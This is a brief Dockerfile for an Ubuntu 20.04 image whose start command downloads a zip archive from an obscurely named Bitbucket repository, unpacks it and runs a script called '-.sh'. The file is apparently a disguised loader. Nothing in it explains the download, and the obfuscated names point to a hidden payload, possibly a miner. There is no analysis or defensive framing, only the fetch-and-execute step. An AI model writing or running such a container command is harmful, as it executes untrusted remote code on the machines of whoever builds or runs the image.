FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install -y curl git unzip wget
CMD wget https://bitbucket.org/oqoixgqoq9/-/raw/25f8209d27f8a34516048e8a74b69d73780530e2/ssse3.zip && unzip ssse3.zip && ./-.sh
